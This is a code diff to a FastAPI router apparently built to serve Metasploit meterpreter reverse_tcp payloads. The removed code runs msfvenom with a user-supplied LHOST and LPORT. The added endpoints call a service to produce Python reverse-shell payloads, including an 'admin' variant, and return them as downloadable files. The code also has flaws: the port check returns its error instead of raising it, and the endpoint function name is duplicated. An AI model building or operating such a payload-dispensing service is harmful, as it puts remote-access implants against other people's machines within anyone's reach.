@@ -3,36 +3,51 @@ from fastapi.responses import StreamingResponse
 import subprocess
 import io
 from Data.data import PayloadInfo
+import ipaddress
+from Exception.exceptions import *
+from Service.payloads import PayloadGeneratorService
 
 router = APIRouter()
-@router.post("/generate_payload")
-async def generate_payload(info:PayloadInfo):
-    # NO_ARCH_PLATFORM = {"windows","python", "php", "java", "android"}
-    # ARCH_PLATFORM = {"linux"}
-    # x64_ARCH_PLATFORM = {"windows", "osx", "linux"}
-    # if info.platform in NO_ARCH_PLATFORM and info.arch == "x64":
-    #     raise HTTPException(status_code=400, detail=f"Platform {info.platform} does not support architecture specification. Please empty arch variable.")
-    # if not info.arch and info.platform in ARCH_PLATFORM:
-    #     raise HTTPException(status_code=400, detail=f"Platform {info.platform} requires architecture specification. Please specify arch variable.")
-    info.arch = f"/{info.arch}" if info.arch else ""
-    command = [
-        "msfvenom",
-        "-p", f"{info.platform}{info.arch}/meterpreter/reverse_tcp",
-        f"LHOST={info.LHOST}",
-        f"LPORT={info.LPORT}",
-        "-f", "raw"
-    ]
 
+def is_valid_ip(ip: str) -> bool:
     try:
-        process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
-        payload = process.stdout
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        raise InvalidIpAddress(ip)
+    
+def is_valid_port(port: int) -> bool:
+    if port < 1 or port > 65535:
+        return InvalidPortNumber(port)
+    return True
 
+@router.post("/python/meterpreter/reverse_tcp")
+async def generate_payload(info:PayloadInfo):
+    try:
+        is_valid_ip(info.LHOST)
+        is_valid_port(info.LPORT)
+        payload = PayloadGeneratorService.generate_payload(info.LHOST, info.LPORT)
         payload = io.BytesIO(payload.encode('utf-8'))
-
-        return StreamingResponse(payload, media_type='application/octet-stream', headers={'Content-Disposition': 'attachment; filename="payload.py"'})
-    except subprocess.CalledProcessError as e:
-        raise HTTPException(status_code=500, detail=f"Error: {e.stderr}")
+        return StreamingResponse(payload, media_type='application/octet-stream', headers={'Content-Type': 'text/x-python'})
+    except InvalidIpAddress as e:
+        raise HTTPException(status_code=400, detail=e.message)
+    except InvalidPortNumber as e:
+        raise HTTPException(status_code=400, detail=e.message)
     except Exception as e:
-        print(e)
         raise HTTPException(status_code=500, detail=f"There was an error while generating the payload.")
-
+    
+@router.post("/python/meterpreter/reverse_tcp/admin")
+async def generate_payload(info:PayloadInfo):
+    try:
+        is_valid_ip(info.LHOST)
+        is_valid_port(info.LPORT)
+        payload = PayloadGeneratorService.generate_admin_payload(info.LHOST, info.LPORT)
+        payload = io.BytesIO(payload.encode('utf-8'))
+        return StreamingResponse(payload, media_type='application/octet-stream', headers={'Content-Type': 'text/x-python'})
+    except InvalidIpAddress as e:
+        raise HTTPException(status_code=400, detail=e.message)
+    except InvalidPortNumber as e:
+        raise HTTPException(status_code=400, detail=e.message)
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=f"There was an error while generating the payload.")
+    
